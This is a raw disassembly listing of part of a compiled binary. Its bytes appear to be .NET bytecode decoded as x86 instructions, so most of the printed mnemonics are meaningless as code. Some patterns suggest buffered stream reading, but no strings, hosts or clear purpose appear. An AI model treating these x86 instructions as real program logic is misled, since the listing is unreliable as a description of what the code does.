  402ba9:	28 08                	sub    %cl,(%eax)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	06                   	push   %es
  402bae:	28 0a                	sub    %cl,(%edx)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	28 0e                	sub    %cl,(%esi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	06                   	push   %es
  402bb8:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402bbe:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402bc5:	06                   	push   %es
  402bc6:	73 3c                	jae    0x402c04
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402bcd:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402bd2:	2b 06                	sub    (%esi),%eax
  402bd4:	16                   	push   %ss
  402bd5:	28 13                	sub    %dl,(%ebx)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	06                   	push   %es
  402bda:	de 09                	fimuls (%ecx)
  402bdc:	26 16                	es push %ss
  402bde:	28 13                	sub    %dl,(%ebx)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	de 00                	fiadds (%eax)
  402be5:	2a 00                	sub    (%eax),%al
  402be7:	00 41 4c             	add    %al,0x4c(%ecx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	c4 00                	les    (%eax),%eax
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	20 00                	and    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	e4 00                	in     $0x0,%al
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	03 00                	add    (%eax),%eax
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 00                	add    %eax,(%eax)
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	02 00                	add    (%eax),%al
  402c06:	00 00                	add    %al,(%eax)
  402c08:	0e                   	push   %cs
  402c09:	01 00                	add    %eax,(%eax)
  402c0b:	00 77 00             	add    %dh,0x0(%edi)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	85 01                	test   %eax,(%ecx)
  402c12:	00 00                	add    %al,(%eax)
  402c14:	0c 00                	or     $0x0,%al
	...
  402c22:	00 00                	add    %al,(%eax)
  402c24:	94                   	xchg   %eax,%esp
  402c25:	02 00                	add    (%eax),%al
  402c27:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	01 00                	add    %eax,(%eax)
  402c32:	00 01                	add    %al,(%ecx)
  402c34:	1b 30                	sbb    (%eax),%esi
  402c36:	02 00                	add    (%eax),%al
  402c38:	46                   	inc    %esi
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	00 28                	add    %ch,(%eax)
  402c41:	15 00 00 06 25       	adc    $0x25060000,%eax
  402c46:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402c4b:	28 40 00             	sub    %al,0x0(%eax)
  402c4e:	00 0a                	add    %cl,(%edx)
  402c50:	28 10                	sub    %dl,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	06                   	push   %es
  402c55:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c5a:	05 28 40 00 00       	add    $0x4028,%eax
  402c5f:	0a 28                	or     (%eax),%ch
  402c61:	08 00                	or     %al,(%eax)
  402c63:	00 06                	add    %al,(%esi)
  402c65:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c6a:	05 28 41 00 00       	add    $0x4128,%eax
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	06                   	push   %es
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c7a:	05 28 42 00 00       	add    $0x4228,%eax
  402c7f:	0a de                	or     %dh,%bl
  402c81:	03 26                	add    (%esi),%esp
  402c83:	de 00                	fiadds (%eax)
  402c85:	2a 00                	sub    (%eax),%al
  402c87:	00 01                	add    %al,(%ecx)
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 42 42             	add    %al,0x42(%edx)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	01 00                	add    %eax,(%eax)
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	1b 30                	sbb    (%eax),%esi
  402c9a:	06                   	push   %es
  402c9b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	11 28                	adc    %ebp,(%eax)
  402ca5:	06                   	push   %es
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	06                   	push   %es
  402ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  402caa:	2c 00                	sub    $0x0,%al
  402cac:	00 0a                	add    %cl,(%edx)
  402cae:	2c 07                	sub    $0x7,%al
  402cb0:	28 12                	sub    %dl,(%edx)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	06                   	push   %es
  402cb5:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	06                   	push   %es
  402cbd:	dd 77 01             	fnsave 0x1(%edi)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	28 08                	sub    %cl,(%eax)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	06                   	push   %es
  402cc7:	02 6f 43             	add    0x43(%edi),%ch
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 0a                	or     (%edx),%cl
  402cce:	06                   	push   %es
  402ccf:	16                   	push   %ss
  402cd0:	3e 53                	ds push %ebx
  402cd2:	01 00                	add    %eax,(%eax)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0e                   	push   %cs
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	06                   	push   %es
  402cda:	06                   	push   %es
  402cdb:	6a 58                	push   $0x58
  402cdd:	28 0f                	sub    %cl,(%edi)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	06                   	push   %es
  402ce2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402ce5:	00 06                	add    %al,(%esi)
  402ce7:	06                   	push   %es
  402ce8:	6a 59                	push   $0x59
  402cea:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 06                	add    %al,(%esi)
  402cf4:	3a f3                	cmp    %bl,%dh
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 06                	add    %al,(%esi)
  402cfe:	16                   	push   %ss
  402cff:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402d03:	0a 6a 28             	or     0x28(%edx),%ch
  402d06:	0d 00 00 06 28       	or     $0x28060000,%eax
  402d0b:	0c 00                	or     $0x0,%al
  402d0d:	00 06                	add    %al,(%esi)
  402d0f:	16                   	push   %ss
  402d10:	6a 3e                	push   $0x3e
  402d12:	b6 00                	mov    $0x0,%dh
  402d14:	00 00                	add    %al,(%eax)
  402d16:	16                   	push   %ss
  402d17:	6a 28                	push   $0x28
  402d19:	0f 00 00             	sldt   (%eax)
  402d1c:	06                   	push   %es
  402d1d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d20:	00 06                	add    %al,(%esi)
  402d22:	d4 8d                	aam    $0x8d
  402d24:	44                   	inc    %esp
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 28                	add    %ebp,(%eax)
  402d29:	0b 00                	or     (%eax),%eax
  402d2b:	00 06                	add    %al,(%esi)
  402d2d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402d30:	08 00                	or     %al,(%eax)
  402d32:	00 06                	add    %al,(%esi)
  402d34:	28 0a                	sub    %cl,(%edx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	06                   	push   %es
  402d39:	28 0e                	sub    %cl,(%esi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402d44:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402d4b:	07                   	pop    %es
  402d4c:	16                   	push   %ss
  402d4d:	30 0b                	xor    %cl,(%ebx)
  402d4f:	16                   	push   %ss
  402d50:	28 13                	sub    %dl,(%ebx)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	06                   	push   %es
  402d55:	dd df                	fstp   %st(7)
  402d57:	00 00                	add    %al,(%eax)
  402d59:	00 28                	add    %ch,(%eax)
  402d5b:	0e                   	push   %cs
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	07                   	pop    %es
  402d60:	6a 58                	push   $0x58
  402d62:	28 0f                	sub    %cl,(%edi)
  402d64:	00 00                	add    %al,(%eax)
  402d66:	06                   	push   %es
  402d67:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	07                   	pop    %es
  402d6d:	6a 59                	push   $0x59
  402d6f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d75:	0c 00                	or     $0x0,%al
  402d77:	00 06                	add    %al,(%esi)
  402d79:	16                   	push   %ss
  402d7a:	6a 2f                	push   $0x2f
  402d7c:	0b 16                	or     (%esi),%edx
  402d7e:	28 13                	sub    %dl,(%ebx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	06                   	push   %es
  402d83:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402d89:	0c 00                	or     $0x0,%al
  402d8b:	00 06                	add    %al,(%esi)
  402d8d:	16                   	push   %ss
  402d8e:	6a 30                	push   $0x30
  402d90:	9e                   	sahf
  402d91:	14 fe                	adc    $0xfe,%al
  402d93:	06                   	push   %es
  402d94:	92                   	xchg   %eax,%edx
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	73 46                	jae    0x402de0
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 73 47             	or     0x47(%ebx),%dh
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	0a 00                	or     (%eax),%al
  402da5:	00 06                	add    %al,(%esi)
  402da7:	6f                   	outsl  %ds:(%esi),(%dx)
  402da8:	48                   	dec    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	0a 16                	or     (%esi),%dl
  402dad:	6a 28                	push   $0x28
  402daf:	0f 00 00             	sldt   (%eax)
  402db2:	06                   	push   %es
  402db3:	1a 6a 28             	sbb    0x28(%edx),%ch
  402db6:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dbb:	0c 00                	or     $0x0,%al
  402dbd:	00 06                	add    %al,(%esi)
  402dbf:	d4 8d                	aam    $0x8d
  402dc1:	44                   	inc    %esp
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	01 28                	add    %ebp,(%eax)
  402dc6:	0b 00                	or     (%eax),%eax
  402dc8:	00 06                	add    %al,(%esi)
  402dca:	2b 31                	sub    (%ecx),%esi
  402dcc:	1a 6a 28             	sbb    0x28(%edx),%ch
  402dcf:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 06                	add    %al,(%esi)
  402dd8:	d4 8d                	aam    $0x8d
  402dda:	44                   	inc    %esp
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	01 28                	add    %ebp,(%eax)
  402ddf:	0b 00                	or     (%eax),%eax
  402de1:	00 06                	add    %al,(%esi)
  402de3:	16                   	push   %ss
  402de4:	6a 28                	push   $0x28
  402de6:	0f 00 00             	sldt   (%eax)
  402de9:	06                   	push   %es
  402dea:	2b 11                	sub    (%ecx),%edx
  402dec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402def:	00 06                	add    %al,(%esi)
  402df1:	16                   	push   %ss
  402df2:	6a 2f                	push   $0x2f
  402df4:	08 16                	or     %dl,(%esi)
  402df6:	28 13                	sub    %dl,(%ebx)
  402df8:	00 00                	add    %al,(%eax)
  402dfa:	06                   	push   %es
  402dfb:	de 3c 28             	fidivrs (%eax,%ebp,1)
  402dfe:	08 00                	or     %al,(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 0a                	sub    %cl,(%edx)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	28 0e                	sub    %cl,(%esi)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	06                   	push   %es
  402e0c:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e12:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402e19:	06                   	push   %es
  402e1a:	73 3c                	jae    0x402e58
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e21:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402e26:	2b 06                	sub    (%esi),%eax
  402e28:	16                   	push   %ss
  402e29:	28 13                	sub    %dl,(%ebx)
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	06                   	push   %es
  402e2e:	de 09                	fimuls (%ecx)
  402e30:	26 16                	es push %ss
  402e32:	28 13                	sub    %dl,(%ebx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	06                   	push   %es
  402e37:	de 00                	fiadds (%eax)
  402e39:	2a 00                	sub    (%eax),%al
  402e3b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402e46:	00 00                	add    %al,(%eax)
  402e48:	8c 01                	mov    %es,(%ecx)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	8c 01                	mov    %es,(%ecx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	09 00                	or     %eax,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	01 00                	add    %eax,(%eax)
  402e56:	00 01                	add    %al,(%ecx)
  402e58:	1b 30                	sbb    (%eax),%esi
  402e5a:	04 00                	add    $0x0,%al
  402e5c:	e5 00                	in     $0x0,%eax
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	05 00 00 11 28       	add    $0x28110000,%eax
  402e65:	14 00                	adc    $0x0,%al
  402e67:	00 06                	add    %al,(%esi)
  402e69:	0a 16                	or     (%esi),%dl
  402e6b:	0b 06                	or     (%esi),%eax
  402e6d:	12 01                	adc    (%ecx),%al
  402e6f:	28 49 00             	sub    %cl,0x0(%ecx)
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	28 12                	sub    %dl,(%edx)
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 03                	sub    $0x3,%al
  402e7b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402e81:	00 00                	add    %al,(%eax)
  402e83:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	0c 28                	or     $0x28,%al
  402e8d:	06                   	push   %es
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	06                   	push   %es
  402e91:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402e96:	00 0a                	add    %cl,(%edx)
  402e98:	26 28 08             	sub    %cl,%es:(%eax)
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	06                   	push   %es
  402e9e:	08 16                	or     %dl,(%esi)
  402ea0:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402eae:	0f 00                	(bad)
  402eb0:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402eb3:	73 4d                	jae    0x402f02
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402ebd:	16                   	push   %ss
  402ebe:	6a 6f                	push   $0x6f
  402ec0:	4e                   	dec    %esi
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	0a 20                	or     (%eax),%ah
  402ec5:	50                   	push   %eax
  402ec6:	c3                   	ret
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402ecd:	01 13                	add    %edx,(%ebx)
  402ecf:	05 2b 1c 28 06       	add    $0x6281c2b,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	06                   	push   %es
  402ed7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402edc:	00 0a                	add    %cl,(%edx)
  402ede:	26 28 08             	sub    %cl,%es:(%eax)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	06                   	push   %es
  402ee4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402eea:	4c                   	dec    %esp
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 09                	or     (%ecx),%cl
  402eef:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402ef5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402efc:	13 04 16             	adc    (%esi,%edx,1),%eax
  402eff:	30 d1                	xor    %dl,%cl
  402f01:	de 30                	fidivs (%eax)
  402f03:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402f06:	09 6f 33             	or     %ebp,0x33(%edi)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a dc                	or     %ah,%bl
  402f0d:	28 06                	sub    %al,(%esi)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	06                   	push   %es
  402f12:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	26 28 08             	sub    %cl,%es:(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	06                   	push   %es
  402f1f:	02 16                	add    (%esi),%dl
  402f21:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402f27:	00 0a                	add    %cl,(%edx)
  402f29:	28 08                	sub    %cl,(%eax)
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	06                   	push   %es
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	4f                   	dec    %edi
  402f30:	00 00                	add    %al,(%eax)
  402f32:	0a de                	or     %dh,%bl
  402f34:	13 26                	adc    (%esi),%esp
  402f36:	16                   	push   %ss
  402f37:	28 13                	sub    %dl,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	06                   	push   %es
  402f3c:	de 0a                	fimuls (%edx)
  402f3e:	07                   	pop    %es
  402f3f:	2c 06                	sub    $0x6,%al
  402f41:	06                   	push   %es
  402f42:	28 50 00             	sub    %dl,0x0(%eax)
  402f45:	00 0a                	add    %cl,(%edx)
  402f47:	dc 2a                	fsubrl (%edx)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 01                	add    %al,(%ecx)
  402f4d:	28 00                	sub    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 55 00             	add    %dl,0x0(%ebp)
  402f54:	4a                   	dec    %edx
  402f55:	9f                   	lahf
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	00 00                	add    %al,(%eax)
  402f5e:	10 00                	adc    %al,(%eax)
  402f60:	c1 d1 00             	rcl    $0x0,%ecx
  402f63:	09 01                	or     %eax,(%ecx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	01 02                	add    %eax,(%edx)
  402f69:	00 08                	add    %cl,(%eax)
  402f6b:	00 d2                	add    %dl,%dl
  402f6d:	da 00                	fiaddl (%eax)
  402f6f:	0a 00                	or     (%eax),%al
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 13                	add    %dl,(%ebx)
  402f75:	30 05 00 86 00 00    	xor    %al,0x8600
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 73 62             	add    %dh,0x62(%ebx)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	06                   	push   %es
  402f85:	25 72 01 21 00       	and    $0x210172,%eax
  402f8a:	70 6f                	jo     0x402ffb
  402f8c:	4d                   	dec    %ebp
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	06                   	push   %es
  402f90:	72 0f                	jb     0x402fa1
  402f92:	21 00                	and    %eax,(%eax)
  402f94:	70 6f                	jo     0x403005
  402f96:	5a                   	pop    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	06                   	push   %es
  402f9a:	25 72 19 21 00       	and    $0x211972,%eax
  402f9f:	70 6f                	jo     0x403010
  402fa1:	4d                   	dec    %ebp
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	06                   	push   %es
  402fa5:	72 29                	jb     0x402fd0
  402fa7:	21 00                	and    %eax,(%eax)
  402fa9:	70 7e                	jo     0x403029
  402fab:	10 00                	adc    %al,(%eax)
  402fad:	00 04 28             	add    %al,(%eax,%ebp,1)
  402fb0:	8e 00                	mov    (%eax),%es
  402fb2:	00 06                	add    %al,(%esi)
  402fb4:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402fb9:	37                   	aaa
  402fba:	21 00                	and    %eax,(%eax)
  402fbc:	70 28                	jo     0x402fe6
  402fbe:	51                   	push   %ecx
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402fc4:	00 00                	add    %al,(%eax)
  402fc6:	06                   	push   %es
  402fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc8:	57                   	push   %edi
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	28 1e                	sub    %bl,(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	06                   	push   %es
  402fd1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402fd7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402fdc:	28 40 00             	sub    %al,0x0(%eax)
  402fdf:	00 0a                	add    %cl,(%edx)
  402fe1:	16                   	push   %ss
  402fe2:	28 18                	sub    %bl,(%eax)
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	06                   	push   %es
  402fe7:	14 fe                	adc    $0xfe,%al
  402fe9:	06                   	push   %es
  402fea:	20 00                	and    %al,(%eax)
  402fec:	00 06                	add    %al,(%esi)
  402fee:	73 3a                	jae    0x40302a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ff5:	17                   	pop    %ss
  402ff6:	73 3b                	jae    0x403033
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	0a 28                	or     (%eax),%ch
  402ffc:	16                   	push   %ss
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	06                   	push   %es
  403000:	28 52 00             	sub    %dl,0x0(%edx)
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 00                	sub    (%eax),%al
  403007:	00 13                	add    %dl,(%ebx)
  403009:	30 03                	xor    %al,(%ebx)
  40300b:	00 38                	add    %bh,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 06                	add    %al,(%esi)
  403011:	00 00                	add    %al,(%eax)
  403013:	11 73 53             	adc    %esi,0x53(%ebx)
  403016:	00 00                	add    %al,(%eax)
  403018:	0a 0a                	or     (%edx),%cl
  40301a:	02 0b                	add    (%ebx),%cl
  40301c:	16                   	push   %ss
  40301d:	0c 2b                	or     $0x2b,%al
  40301f:	1f                   	pop    %ds
  403020:	07                   	pop    %es
  403021:	08 91 0d 06 72 3b    	or     %dl,0x3b72060d(%ecx)
  403027:	21 00                	and    %eax,(%eax)
  403029:	70 09                	jo     0x403034
  40302b:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  40302f:	01 28                	add    %ebp,(%eax)
  403031:	54                   	push   %esp
  403032:	00 00                	add    %al,(%eax)
  403034:	0a 6f 55             	or     0x55(%edi),%ch
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 26                	or     (%esi),%ah
  40303b:	08 17                	or     %dl,(%edi)
  40303d:	58                   	pop    %eax
  40303e:	0c 08                	or     $0x8,%al
  403040:	07                   	pop    %es
  403041:	8e 69 32             	mov    0x32(%ecx),%gs
  403044:	db 06                	fildl  (%esi)
  403046:	6f                   	outsl  %ds:(%esi),(%dx)
  403047:	38 00                	cmp    %al,(%eax)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	2a 13                	sub    (%ebx),%dl
  40304d:	30 03                	xor    %al,(%ebx)
  40304f:	00 38                	add    %bh,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	00 00                	add    %al,(%eax)
  403057:	11 73 53             	adc    %esi,0x53(%ebx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	0a 0a                	or     (%edx),%cl
  40305e:	02 0b                	add    (%ebx),%cl
  403060:	16                   	push   %ss
  403061:	0c 2b                	or     $0x2b,%al
  403063:	1f                   	pop    %ds
  403064:	07                   	pop    %es
  403065:	08 91 0d 06 72 4b    	or     %dl,0x4b72060d(%ecx)
  40306b:	21 00                	and    %eax,(%eax)
  40306d:	70 09                	jo     0x403078
  40306f:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  403073:	01 28                	add    %ebp,(%eax)
  403075:	54                   	push   %esp
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 6f 55             	or     0x55(%edi),%ch
  40307b:	00 00                	add    %al,(%eax)
  40307d:	0a 26                	or     (%esi),%ah
  40307f:	08 17                	or     %dl,(%edi)
  403081:	58                   	pop    %eax
  403082:	0c 08                	or     $0x8,%al
  403084:	07                   	pop    %es
  403085:	8e 69 32             	mov    0x32(%ecx),%gs
  403088:	db 06                	fildl  (%esi)
  40308a:	6f                   	outsl  %ds:(%esi),(%dx)
  40308b:	38 00                	cmp    %al,(%eax)
  40308d:	00 0a                	add    %cl,(%edx)
  40308f:	2a 13                	sub    (%ebx),%dl
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	29 00                	sub    %eax,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	07                   	pop    %es
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 02                	adc    %eax,(%edx)
  40309d:	8e 69 8d             	mov    -0x73(%ecx),%gs
  4030a0:	44                   	inc    %esp
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	01 0a                	add    %ecx,(%edx)
  4030a5:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  4030ab:	16                   	push   %ss
  4030ac:	0c 2b                	or     $0x2b,%al
  4030ae:	0e                   	push   %cs
  4030af:	06                   	push   %es
  4030b0:	08 02                	or     %al,(%edx)
  4030b2:	07                   	pop    %es
  4030b3:	91                   	xchg   %eax,%ecx
  4030b4:	9c                   	pushf
  4030b5:	07                   	pop    %es
  4030b6:	17                   	pop    %ss
  4030b7:	59                   	pop    %ecx
  4030b8:	0b 08                	or     (%eax),%ecx
  4030ba:	17                   	pop    %ss
  4030bb:	58                   	pop    %eax
  4030bc:	0c 08                	or     $0x8,%al
  4030be:	06                   	push   %es
  4030bf:	8e 69 32             	mov    0x32(%ecx),%gs
  4030c2:	ec                   	in     (%dx),%al
  4030c3:	06                   	push   %es
  4030c4:	2a 00                	sub    (%eax),%al
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	13 30                	adc    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	33 00                	xor    (%eax),%eax
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	01 00                	add    %eax,(%eax)
  4030d2:	00 11                	add    %dl,(%ecx)
  4030d4:	16                   	push   %ss
  4030d5:	0a 2b                	or     (%ebx),%ch
  4030d7:	15 02 7b 26 00       	adc    $0x267b02,%eax
  4030dc:	00 04 06             	add    %al,(%esi,%eax,1)
  4030df:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e0:	59                   	pop    %ecx
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	0a 6f 39             	or     0x39(%edi),%ch
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	06                   	push   %es
  4030ea:	17                   	pop    %ss
  4030eb:	58                   	pop    %eax
  4030ec:	0a 06                	or     (%esi),%al
  4030ee:	02 7b 26             	add    0x26(%ebx),%bh
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	5a                   	pop    %edx
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	0a 32                	or     (%edx),%dh
  4030fa:	dd 02                	fldl   (%edx)
  4030fc:	7b 26                	jnp    0x403124
  4030fe:	00 00                	add    %al,(%eax)
  403100:	04 6f                	add    $0x6f,%al
  403102:	5c                   	pop    %esp
  403103:	00 00                	add    %al,(%eax)
  403105:	0a 2a                	or     (%edx),%ch
  403107:	00 13                	add    %dl,(%ebx)
  403109:	30 02                	xor    %al,(%edx)
  40310b:	00 1b                	add    %bl,(%ebx)
  40310d:	00 00                	add    %al,(%eax)
  40310f:	00 08                	add    %cl,(%eax)
  403111:	00 00                	add    %al,(%eax)
  403113:	11 73 62             	adc    %esi,0x62(%ebx)
  403116:	00 00                	add    %al,(%eax)
  403118:	06                   	push   %es
  403119:	0a 06                	or     (%esi),%al
  40311b:	02 7d 25             	add    0x25(%ebp),%bh
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 02                	add    $0x2,%al
